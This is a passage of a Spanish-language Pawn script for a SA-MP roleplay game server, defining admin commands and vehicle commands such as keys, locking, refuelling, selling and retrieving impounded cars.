//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/payday", true) == 0) //Fuerza el payday
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        PlayerInfo[i][pMinPayDay] = 21;
		PayDay(i);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/listaobjetos", true) == 0) //Lista de nombre de objetos
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
    	SendClientMessage(playerid, Naranja, "* /ListaObjetos [1: 0-50 | 2: 50-100 | 3: 100-150 | 4: 150-200]");
		return 1;
	}
	new indice = strval(tmp);
	switch(indice)
	{
	    case 1:
	    {
	        for(new i = 0; i <= 50; i++)
		    {
				format(string, sizeof(string), "%d: %s", i, ObjetoInfo[i][NombreObjeto]);
		        SendClientMessage(playerid, Amarillo, string);
		    }
	    }
	    case 2:
	    {
	        for(new i = 50; i <= 100; i++)
		    {
				format(string, sizeof(string), "%d: %s", i, ObjetoInfo[i][NombreObjeto]);
		        SendClientMessage(playerid, Amarillo, string);
		    }
	    }
	    case 3:
	    {
	        for(new i = 100; i <= 150; i++)
		    {
				format(string, sizeof(string), "%d: %s", i, ObjetoInfo[i][NombreObjeto]);
		        SendClientMessage(playerid, Amarillo, string);
		    }
	    }
	    case 4:
	    {
	        for(new i = 150; i <= sizeof(ObjetoInfo); i++)
		    {
				format(string, sizeof(string), "%d: %s", i, ObjetoInfo[i][NombreObjeto]);
		        SendClientMessage(playerid, Amarillo, string);
		    }
	    }
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/acurar", true) == 0)
{
	if(PlayerInfo[playerid][pAdmin] < 2){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
    	SendClientMessage(playerid, Naranja, "* /ACurar [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2))
	{
		SendClientMessage(playerid, Rojo, "* ID inválida.");
		return 1;
	}
	if(PlayerInfo[playerid2][pMuerto] == 0){SendClientMessage(playerid, Rojo, "* Este jugador no necesita ser reanimado."); return 1;}
    RemovePlayerFromVehicle(playerid2);
    SetCameraBehindPlayer(playerid2);
	format(string, sizeof(string), "El administrador '%s' ha reanimado a '%s'.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    ProxDetector(15.0, playerid2, string, VerdeClaro,VerdeClaro,VerdeClaro,VerdeClaro,VerdeClaro);
    format(string, sizeof(string), "Has salvado a '%s' de su estado de desmayo.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AzulClaro, string);
    format(string, sizeof(string), "'%s' ha salvado a '%s' de su estado de desmayo.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    SendAdminMessage(Aguamarina, string);
    printf(string);
	PlayerInfo[playerid2][pMuerto] = 0;
	KillTimer(MuertoTimer[playerid2]);
	KillTimer(MuertoFlashTimer[playerid2]);
	ClearAnimations(playerid2, 1);
	TogglePlayerControllable(playerid2, 1);
	RemovePlayerColorFade(playerid2);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/darropa", true) == 0) //Dar un skin a un jugador
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Darropa [ID] [Skin]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Darropa [ID] [Skin]");
        return 1;
    }
    new SkinID = strval(tmp);
    if(SkinID < 1 || SkinID > 299){SendClientMessage(playerid, Rojo, "* El skin debe estar entre 1 y 299."); return 1;}
    SetPlayerSkin(playerid2, SkinID);
    PlayerInfo[playerid2][pSkin] = SkinID;
	format(string, sizeof(string), "'%s' te ha dado el skin %d.", GetPlayerNameRP(playerid), SkinID);
	SendClientMessage(playerid2, AzulClaro, string);
	format(string, sizeof(string), "Has dado el skin %d a '%s'.", SkinID, GetPlayerNameRP(playerid2));
	SendClientMessage(playerid, AzulClaro, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

//----------COMANDOS VEHÍCULOS----------//

if(strcmp(cmd, "/carid", true) == 0) //Retorna la ID del vehículo
{
	if(!IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un vehículo."); return 1;}
	new carid = GetPlayerVehicleID(playerid);
	format(string, sizeof(string), "ID vehículo: %d.", carid);
	SendClientMessage(playerid, Naranja, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/oldcar", true) == 0) //Retorna la ID del vehículo en el que subió
{
	format(string, sizeof(string), "ID último vehículo en el que montaste: %d.", oldcarid[playerid]);
	SendClientMessage(playerid, Naranja, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/cinturon", true) == 0) //Pone/quita cinturón de seguridad
{
    if(!GetPlayerVehicleID(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un vehículo."); return 1;}
    new car = GetPlayerVehicleID(playerid);
    if(IsABike(car) || IsAMBike(car) || IsABoat(car)){SendClientMessage(playerid, Rojo, "* Este vehículo no tiene cinturón."); return 1;}
    if(CinturonPuesto[playerid] == 0) //Ponerse cinturón
    {
        CinturonPuesto[playerid] = 1;
        format(string, sizeof(string), "* %s se coloca el cinturón de seguridad.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
    }
    else //Quitarse cinturón
    {
        format(string, sizeof(string), "* %s se quita el cinturón de seguridad.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
        CinturonPuesto[playerid] = 0;
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/motor", true) == 0) //Encender motor de un vehículo
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
	new car = GetPlayerVehicleID(playerid);
	if(IsABike(car)){SendClientMessage(playerid, Rojo, "* Este vehículo no tiene motor."); return 1;}
	EncenderMotorF(playerid, car);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/luces", true) == 0) //Encender luces de un vehículo
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
    new car = GetPlayerVehicleID(playerid);
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
    if(lights == 0)SetVehicleParamsEx(car,engine,1,alarm,doors,bonnet,boot,objective);
    else SetVehicleParamsEx(car,engine,0,alarm,doors,bonnet,boot,objective);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/prestarllave", true) == 0) //Prestar llave
{
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /PrestarLlave [ID] [1/2/3/4/5]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid2 == playerid){SendClientMessage(playerid,Rojo,"* No te puedes prestar la llave a tí mismo."); return 1;}
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /PrestarLlave [ID] [1/2/3/4/5]");
        return 1;
    }
    new slot = strval(tmp);
    if(slot < 1 || slot > 5){SendClientMessage(playerid, Rojo, "* El slot debe estar entre 1 y 5."); return 1;}
	if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	if(PlayerInfo[playerid][pLlaveCoche][slot-1] == 0){SendClientMessage(playerid, Rojo, "* No tienes ninguna llave en ese slot."); return 1;}
	new tieneslotlibre = -1;
	for(new x=0; x<5; x++)
	{
	    if(PlayerInfo[playerid2][pLlaveCochePrestado][x] == 0){tieneslotlibre = x; break;}
	}
	if(tieneslotlibre == -1){SendClientMessage(playerid, Rojo, "* Ese jugador tiene todas las llaves de vehículos prestados ocupados."); return 1;}
	
	new yatienellave = -1;
	for(new x=0; x<5; x++)
	{
	    if(PlayerInfo[playerid][pLlaveCoche][slot-1] != PlayerInfo[playerid2][pLlaveCochePrestado][x]){yatienellave = x;break;}
	}
	if(yatienellave == -1){SendClientMessage(playerid, Rojo, "* Ese jugador ya tiene una llave prestada de ese vehículo."); return 1;}
	
	PrestadorCoche[playerid2] = playerid; // /PrestarLlave
    LlavePrestada[playerid2] = PlayerInfo[playerid][pLlaveCoche][slot-1];
    
	format(string, sizeof(string), "Has ofrecido la llave de tu vehículo LS-%d a %s. Espera una respuesta.", PlayerInfo[playerid][pLlaveCoche][slot-1], GetPlayerNameRP(playerid2));
	SendClientMessage(playerid, Amarillo, string);
	format(string, sizeof(string), "%s te ha ofrecido la llave de tu vehículo LS-%d. Escribe '/Aceptar Llave' para aceptarla.", GetPlayerNameRP(playerid), PlayerInfo[playerid][pLlaveCoche][slot-1]);
	SendClientMessage(playerid2, Amarillo, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/tirarllave", true) == 0) //Tirar llave prestada
{
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /TirarLlave [6/7/8/9/10]");
        return 1;
    }
    new slot = strval(tmp);
    if(slot < 6 || slot > 10){SendClientMessage(playerid, Rojo, "* El slot debe estar entre 6 y 10."); return 1;}
	if(PlayerInfo[playerid][pLlaveCochePrestado][slot-6] == 0){SendClientMessage(playerid, Rojo, "* No tienes ninguna llave en ese slot."); return 1;}

    format(string, sizeof(string), "* %s tira la llave del vehículo LS-%d.", GetPlayerNameRP(playerid), PlayerInfo[playerid][pLlaveCochePrestado][slot-6]);
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	format(string, sizeof(string), "Has tirado la llave del vehículo LS-%d.", PlayerInfo[playerid][pLlaveCochePrestado][slot-6]);
	SendClientMessage(playerid, Amarillo, string);
	
	PlayerInfo[playerid][pLlaveCochePrestado][slot-6] = 0;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/ventanilla", true) == 0) //Subir bajar la ventanilla de un vehículo
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
	new carid = GetPlayerVehicleID(playerid);
	if(IsABike(carid) || IsAMBike(carid) || IsAPizzaBike(carid) || IsABoat(carid) || IsAPlane(carid)){SendClientMessage(playerid, Rojo, "* Este vehículo no tiene ventanillas."); return 1;}
 	if(VehicleWindows[carid] == 0)
 	{
 	    format(string, sizeof(string), "* %s baja la ventanilla de su vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    VehicleWindows[carid] = 1;
 	}
 	else
 	{
 	    format(string, sizeof(string), "* %s sube la ventanilla de su vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    VehicleWindows[carid] = 0;
 	}
 	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/bloqueo", true) == 0) //Abrir o cerrar vehículo
{
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Bloqueo [1/2/3/4/5|6/7/8/9/10]");
        return 1;
    }
    new slot = strval(tmp);
    if(slot < 1 || slot > 10){SendClientMessage(playerid, Rojo, "* El número del slot debe estar entre 1 y 5."); return 1;}
    if(slot < 6)
    {
    	if(PlayerInfo[playerid][pLlaveCoche][slot-1] == 0){SendClientMessage(playerid, Rojo, "* No tienes ninguna llave en ese slot."); return 1;}
    }
    else if(slot < 11)
    {
    	if(PlayerInfo[playerid][pLlaveCochePrestado][slot-6] == 0){SendClientMessage(playerid, Rojo, "* No tienes ninguna llave en ese slot."); return 1;}
    }
	new car;
	if(slot < 6)
	{
		for(new x=MAX_VEHPUBLICO+1; x <= TotalVeh; x++)
		{
		    if(CarInfo[x][cLlave] == PlayerInfo[playerid][pLlaveCoche][slot-1]){car = x; break;}
		}
	}
	else if(slot < 11)
	{
		for(new x=MAX_VEHPUBLICO+1; x <= TotalVeh; x++)
		{
		    if(CarInfo[x][cLlave] == PlayerInfo[playerid][pLlaveCochePrestado][slot-6]){car = x; break;}
		}
	}
	new Float:vX, Float:vY, Float:vZ;
	GetVehiclePos(car, vX, vY, vZ);
	if(!IsPlayerInRangeOfPoint(playerid, 20, vX, vY, vZ)){SendClientMessage(playerid, Rojo, "* Debes estar a menos de 20 metros."); return 1;}
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
	if(CarInfo[car][cCerrado] == 0)
	{
		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
		CarInfo[car][cCerrado] = 1;
		format(string, sizeof(string), "Vehículo %d (LS-%d) cerrado.", slot, CarInfo[car][cLlave]);
		SendClientMessage(playerid, Amarillo, string);
	}
    else
	{
		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
		CarInfo[car][cCerrado] = 0;
		format(string, sizeof(string), "Vehículo %d (LS-%d) abierto.", slot, CarInfo[car][cLlave]);
		SendClientMessage(playerid, Amarillo, string);
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gas", true) == 0) //Mirar combustible del vehículo
{
    if(!GetPlayerVehicleID(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un vehículo."); return 1;}
    new carid = GetPlayerVehicleID(playerid);
    if(carid <= MAX_VEHPUBLICO){return 1;}
    format(string, sizeof(string), "Cantidad de combustible en el depósito: %dL.", CarInfo[carid][cGas]);
    SendClientMessage(playerid, Amarillo, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/rellenar", true) == 0) //Llenar depósito de un vehículo
{
	if(LlenandoDeposito[playerid] == 1){SendClientMessage(playerid, Rojo, "* Ya estás rellenando el depósito."); return 1;}
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
    new carid = GetPlayerVehicleID(playerid);
    if(carid <= MAX_VEHPUBLICO || IsABike(carid)){SendClientMessage(playerid, Rojo, "* Este vehículo no puede ser llenado."); return 1;}
    if(CarInfo[carid][cGas] >= 100){SendClientMessage(playerid, Rojo, "* Este vehículo tiene el depósito lleno."); return 1;}
    if(IsPlayerInRangeOfPoint(playerid, 8.0, 1942.3715,-1772.8678,13.6406)){} //Si no está en una gasolinera
    else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1004.0308,-937.5370,42.3281)){}
    else if(IsPlayerInRangeOfPoint(playerid, 8.0, 655.8026,-564.9006,16.3359)){}
    else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1382.3381,460.1285,20.3452)){}
    else if(IsPlayerInRangeOfPoint(playerid, 8.0, -90.7019,-1168.8009,2.4183)){}
    else if(IsPlayerInRangeOfPoint(playerid, 8.0, 2485.1809,-2078.8872,13.5469)){}
    else{SendClientMessage(playerid, Rojo, "* No estás en una gasolinera."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Rellenar [Cantidad]");
        return 1;
    }
    new cantidad = strval(tmp);
    if(cantidad < 0 || cantidad > 100){SendClientMessage(playerid, Rojo, "* La cantidad debe estar entre 1 y 100."); return 1;}
    new precio = (cantidad*1);
    if(GetPlayerMoney(playerid) < precio){format(string, sizeof(string), "* No tienes suficiente dinero (%d$).", precio); SendClientMessage(playerid, Rojo, string); return 1;}
    TogglePlayerControllable(playerid, 0);
    if((100-CarInfo[carid][cGas]) < cantidad)cantidad = (100-CarInfo[carid][cGas]), precio = cantidad*1; //Si cantidad es mayor a capacidad del depósito, hacer la resta y ajustar precio
    CarInfo[carid][cGas] += cantidad; //Dar combustible al coche
    format(string, sizeof(string), "* Un operario se acerca al vehículo de %s y comienza a rellenarle el depósito.", GetPlayerNameRP(playerid));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
    format(string, sizeof(string), "FACTURA: %dL | %d$.", cantidad, precio);
    SendClientMessage(playerid, AmarilloClaro, string);
    format(string, sizeof(string), "Depósito: %dL.", CarInfo[carid][cGas]);
	SendClientMessage(playerid, AmarilloClaro, string);
	GivePlayerMoneyAC(playerid, -precio);
	LlenandoDeposito[playerid] = 1;
	SetTimerEx("LlenarDeposito", 7000, false, "i", playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/venderveh", true) == 0) //Vender vehículo al desguace
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
	if(GetPlayerVehicleID(playerid) <= MAX_VEHPUBLICO){SendClientMessage(playerid, Rojo, "* No eres dueño de este vehículo."); return 1;}
	new EsPropietario;
	for(new x=0; x<5; x++)
	{
	    if(CarInfo[GetPlayerVehicleID(playerid)][cLlave] == PlayerInfo[playerid][pLlaveCoche][x])EsPropietario = 1;
	}
    if(EsPropietario == 0){SendClientMessage(playerid, Rojo, "* No eres dueño de este vehículo."); return 1;}
    new carid = GetPlayerVehicleID(playerid);
    if(IsAPlane(carid)){SendClientMessage(playerid, Rojo, "* Para vender aviones habla con un admin."); return 1;}
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, 2274.1028,-2345.5371,13.5469) && !IsPlayerInRangeOfPoint(playerid, 8.0, 2294.3999000,-2447.8000500,0.0000000))
	{
		if(!IsABoat(carid)){SetPlayerCheckpoint(playerid, 2274.1028,-2345.5371,13.5469, 4.0);}
		if(IsABoat(carid)){SetPlayerCheckpoint(playerid, 2294.3999,-2447.8000,0.0000, 4.0);}
		SendClientMessage(playerid, Rojo, "* No estás en el desguace.");
		return 1;
	}
	new precio = (3*CarInfo[carid][cValor]/5);
	if(VenderVeh[playerid] == 0)
	{
	    format(string, sizeof(string), "¿Estás seguro de que deseas vender tu %s al desguace? Recibirás 3/5 de su valor por él (%d$).", CarInfo[carid][cNombreModelo], precio);
		SendClientMessage(playerid, Amarillo, string);
		SendClientMessage(playerid, Amarillo, "Escribe '/VenderVeh' de nuevo para realizar la venta.");
		VenderVeh[playerid] = 1;
	}
	else
	{
	    for(new x=0; x<5; x++)
		{
		    if(CarInfo[carid][cLlave] == PlayerInfo[playerid][pLlaveCoche][x])PlayerInfo[playerid][pLlaveCoche][x] = 0;
		}
	    format(string, sizeof(string), "Recibes %d$ por tu %s.", precio, CarInfo[carid][cNombreModelo]);
		SendClientMessage(playerid, Verde, string);
		DestroyVehicle(carid);
		CarInfo[carid][cLlave] = 0;
		CarInfo[idx][cModelo] = 0;
		CarInfo[idx][cPosX] = 0;
		CarInfo[idx][cPosY] = 0;
		CarInfo[idx][cPosZ] = 0;
		CarInfo[idx][cZAngle] = 0;
		CarInfo[idx][cColor1] = 0;
		CarInfo[idx][cColor2] = 0;
		CarInfo[idx][cComprado] = 0;
		CarInfo[idx][cDueno] = 0;
		CarInfo[idx][cNombreModelo] = 0;
		CarInfo[idx][cValor] = 0;
		CarInfo[idx][cCerrado] = 0;
		CarInfo[idx][cGas] = 0;
		CarInfo[idx][cEnDeposito] = 0;
		for(new x=0; x<7; x++)
		{
			CarInfo[idx][cMaletero][x] = 0;
		}

		for(new x=0; x<7; x++)
		{
			CarInfo[idx][cMaleteroCant][x] = 0;
		}
		CarInfo[idx][cMaxMaletero] = 0;
		GivePlayerMoneyAC(playerid, precio);
	    VenderVeh[playerid] = 0;
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/venderveha", true) == 0) //Vender vehículo a otro jugador
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
	if(GetPlayerVehicleID(playerid) <= MAX_VEHPUBLICO){SendClientMessage(playerid, Rojo, "* No eres dueño de este vehículo."); return 1;}
	new EsPropietario;
	for(new x=0; x<5; x++)
	{
	    if(CarInfo[GetPlayerVehicleID(playerid)][cLlave] == PlayerInfo[playerid][pLlaveCoche][x])EsPropietario = 1;
	}
    if(EsPropietario == 0){SendClientMessage(playerid, Rojo, "* No eres dueño de este vehículo."); return 1;}
    new carid = GetPlayerVehicleID(playerid);
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /VenderVehA [ID] [Precio]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid2 == playerid){SendClientMessage(playerid,Rojo,"* No te puedes vender el vehículo a tí mismo."); return 1;}
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
    new SlotDisponible = NOEXISTE;
    for(new x=0; x<5; x++)
    {
        if(PlayerInfo[playerid2][pLlaveCoche][x] == 0){SlotDisponible = x; break;}
    }
    if(SlotDisponible == NOEXISTE){SendClientMessage(playerid, Rojo, "* Este jugador tiene todos los huecos de llaves ocupados."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /VenderVehA [ID] [Precio]");
        return 1;
    }
    new precio = strval(tmp);
    if(precio < 1 || precio > CarInfo[carid][cValor]){SendClientMessage(playerid, Rojo, "* El precio debe estar entre 1$ y el valor neto del propio vehículo."); return 1;}
    format(string, sizeof(string), "* %s te ofrece su %s por %d$. Escribe '/Aceptar CompraVeh' para comprárselo.", GetPlayerNameRP(playerid), CarInfo[carid][cNombreModelo], precio);
    SendClientMessage(playerid2, Amarillo, string);
    format(string, sizeof(string), "* Has ofrecido tu %s a %s por %d$. Espera a que responda.", CarInfo[carid][cNombreModelo], GetPlayerNameRP(playerid2), precio);
    SendClientMessage(playerid, Amarillo, string);
    VenderVehAPrecio[playerid2] = precio;
	VenderVehAVendedor[playerid2] = playerid;
	VenderVehALlave[playerid2] = CarInfo[carid][cLlave];
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/localizarveh", true) == 0) //Localizar un vehículo
{
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /LocalizarVeh [1/2/3/4/5]");
        SendClientMessage(playerid, Naranja, "Precio: 50$.");
        return 1;
    }
    new slot = strval(tmp);
    if(slot < 1 || slot > 5){SendClientMessage(playerid, Rojo, "* El número del slot debe estar entre 1 y 5."); return 1;}
    if(PlayerInfo[playerid][pLlaveCoche][slot-1] == 0){SendClientMessage(playerid, Rojo, "* No tienes ninguna llave en ese slot."); return 1;}
	new car;
	for(new x=MAX_VEHPUBLICO+1; x <= TotalVeh; x++)
	{
	    if(CarInfo[x][cLlave] == PlayerInfo[playerid][pLlaveCoche][slot-1]){car = x; break;}
	}
	if(!IsValidVehicle(car)){SendClientMessage(playerid, Rojo, "* Vehículo no encontrado."); return 1;}
	if(CarInfo[car][cEnDeposito] == 1) //Si está en desguace
	{
	    if(IsABoat(car)){SetPlayerCheckpoint(playerid, 2294.3999,-2447.8000,0.0000, 4.0);}
	    if(!IsABoat(car)){SetPlayerCheckpoint(playerid, 2274.1028,-2345.5371,13.5469, 4.0);}
	    SendClientMessage(playerid, Amarillo, "* Tu vehículo se encuentra en el depósito de Ocean Docks.");
	    LocalizarVeh[playerid] = 1;
	    return 1;
	}
	if(CarInfo[car][cEnDeposito] == 2) //Si está en depósito LSPD
	{
	    SetPlayerCheckpoint(playerid, 1621.5406,-1866.9160,13.5469, 4.0);
	    SendClientMessage(playerid, Amarillo, "* Tu vehículo se encuentra en el depósito de LSPD.");
	    LocalizarVeh[playerid] = 1;
	    return 1;
	}
	new Float:vX, Float:vY, Float:vZ;
	GetVehiclePos(car, vX, vY, vZ);
	SetPlayerCheckpoint(playerid, vX,vY,vZ, 4.0);
	SendClientMessage(playerid, Amarillo, "* Vehículo localizado por 50$.");
	PlayerInfo[playerid][pDineroBanco] -= 50;
	LocalizarVeh[playerid] = 1;
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desembargar", true) == 0) //Sacar vehículo del depósito LSPD
{
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Desembargar [1/2/3/4/5]");
        return 1;
    }
    new slot = strval(tmp);
    if(slot < 1 || slot > 5){SendClientMessage(playerid, Rojo, "* El número del slot debe estar entre 1 y 5."); return 1;}
    if(PlayerInfo[playerid][pLlaveCoche][slot-1] == 0){SendClientMessage(playerid, Rojo, "* No tienes ninguna llave en ese slot."); return 1;}
	new car;
	for(new x=MAX_VEHPUBLICO+1; x <= TotalVeh; x++)
	{
	    if(CarInfo[x][cLlave] == PlayerInfo[playerid][pLlaveCoche][slot-1]){car = x; break;}
	}
	
	if(CarInfo[car][cEnDeposito] != 2){SendClientMessage(playerid, Rojo, "* Este vehículo no se encuentra en el depósito de LSPD."); return 1;}
	
	if(!IsPlayerInRangeOfPoint(playerid, 7.0, 1621.5406,-1866.9160,13.5469))
	{
		SendClientMessage(playerid, Rojo, "* No estás en el depósito de LSPD.");
		return 1;
	}
	
	new precio = (CarInfo[car][cValor]/30);

	if(GetPlayerMoney(playerid) < precio)
	{
	    format(string, sizeof(string), "* Necesitas %d$ para sacar este vehículo del depósito.", precio);
	    SendClientMessage(playerid, Rojo, string);
	    return 1;
	}
	
	for(new i=0; i <= TotalVeh; i++)
	{
		if(IsVehicleInRangeOfPoint(4.0, i, 1621.5406,-1866.9160,13.5469))
		{
			SendClientMessage(playerid, Rojo, "* Hay un vehículo en el punto de entrega.");
			return 1;
		}
	}

 	GivePlayerMoneyAC(playerid, -precio);
	format(string, sizeof(string), "* Has retirado tu %s del depósito de LSPD por %d$.", CarInfo[car][cNombreModelo], precio);
    SendClientMessage(playerid, Amarillo, string);
    format(string, sizeof(string), "'%s' ha sacado su %s del depósito de LSPD por %d$.", GetPlayerNameRP(playerid), CarInfo[car][cNombreModelo], precio);
    SendAdminMessage(Aguamarina, string);
    printf(string);
    CarInfo[car][cEnDeposito] = 0;
    CarInfo[car][cGas] = 15;
    SetVehiclePos(car, 1621.5406,-1866.9160,13.5469);
	SetVehicleZAngle(car, 90);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/sacardeposito", true) == 0) //Sacar vehículo del desguace
{
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /SacarDeposito [1/2/3/4/5]");
        return 1;
    }
    new slot = strval(tmp);
    if(slot < 1 || slot > 5){SendClientMessage(playerid, Rojo, "* El número del slot debe estar entre 1 y 5."); return 1;}
    if(PlayerInfo[playerid][pLlaveCoche][slot-1] == 0){SendClientMessage(playerid, Rojo, "* No tienes ninguna llave en ese slot."); return 1;}
	new car;
	for(new x=MAX_VEHPUBLICO+1; x <= TotalVeh; x++)
	{
	    if(CarInfo[x][cLlave] == PlayerInfo[playerid][pLlaveCoche][slot-1]){car = x; break;}
	}
	
	if(CarInfo[car][cEnDeposito] != 1){SendClientMessage(playerid, Rojo, "* Este vehículo no se encuentra en el depósito de Ocean Docks."); return 1;}
	
	if(!IsPlayerInRangeOfPoint(playerid, 4.0, 2274.1028,-2345.5371,13.5469) && !IsPlayerInRangeOfPoint(playerid, 8.0, 2286.8096,-2423.5090,3.0000))
	{
		SendClientMessage(playerid, Rojo, "* No estás en el depósito de Ocean Docks.");
		return 1;
	}
	
	new precio = (CarInfo[car][cValor]/12);
	
	if(GetPlayerMoney(playerid) < precio)
	{
	    format(string, sizeof(string), "* Necesitas %d$ para sacar este vehículo del depósito.", precio);
	    SendClientMessage(playerid, Rojo, string);
	    return 1;
	}
	
	if(IsABoat(car) && !IsPlayerInRangeOfPoint(playerid, 4.0, 2286.8096,-2423.5090,3.0000))
	{
		SendClientMessage(playerid, Rojo, "* Este vehículo es un barco. Ve al muelle de carga del depósito.");
		SetPlayerCheckpoint(playerid, 2286.8096,-2423.5090,3.0000, 4.0);
		return 1;
	}
	if(!IsABoat(car) && !IsPlayerInRangeOfPoint(playerid, 4.0, 2274.1028,-2345.5371,13.5469))
	{
	    SendClientMessage(playerid, Rojo, "* Este vehículo no es un barco. Ve a la entrada principal del depósito.");
		SetPlayerCheckpoint(playerid, 2274.1028,-2345.5371,13.5469, 4.0);
		return 1;
 	}
 	
